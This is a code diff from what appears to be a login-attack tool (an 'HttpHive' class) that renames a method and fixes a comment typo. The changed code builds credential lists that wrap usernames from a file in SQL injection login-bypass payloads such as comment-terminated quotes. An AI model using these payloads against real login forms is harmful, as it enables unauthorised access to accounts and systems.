@@ -570,22 +570,22 @@ class HttpHive(Hive):
 			password = groups['password']
 			cred = Credential(username,password,self.target)
 			self.SQLInjectionCredentialList.append(cred)
-		# building injections based on supplied usernaem
+		# building injections based on supplied username
 		if self.username:
-			self.SQLInjectionCredentialList += self.__buildSQLInjectionUsernames__(self.username)
+			self.SQLInjectionCredentialList += self.__buildSQLInjectionCredentials__(self.username)
 			self.SQLInjectionCredentialList = sorted(self.SQLInjectionCredentialList,reverse=True)
 		# building injections with supplied username-file
 		else:
 			for username in open(self.usernameFile, 'r').readlines():
 				username = cleanup_regex.subn('',username)[0]
 				username = username.split('\n')[0]	
-				self.SQLInjectionCredentialList += self.__buildSQLInjectionUsernames__(username)
+				self.SQLInjectionCredentialList += self.__buildSQLInjectionCredentials__(username)
 	
-	# function: __buildSQLInjectionUsernames__
+	# function: __buildSQLInjectionCredentials__
 	# param: str		- username to build injections with
 	# return: [Credential]	- array of SQL Injection based Credentials 
 	# description: Builds a list of Credential objects that have SQL injections built around the username supplied
-	def __buildSQLInjectionUsernames__(self,username):
+	def __buildSQLInjectionCredentials__(self,username):
 		injections = ['%s\' --','%s\' #','%s\'/*','%s\'/**/--','%s\'/**/#']
 		new_creds = list()
 		for inject in injections:
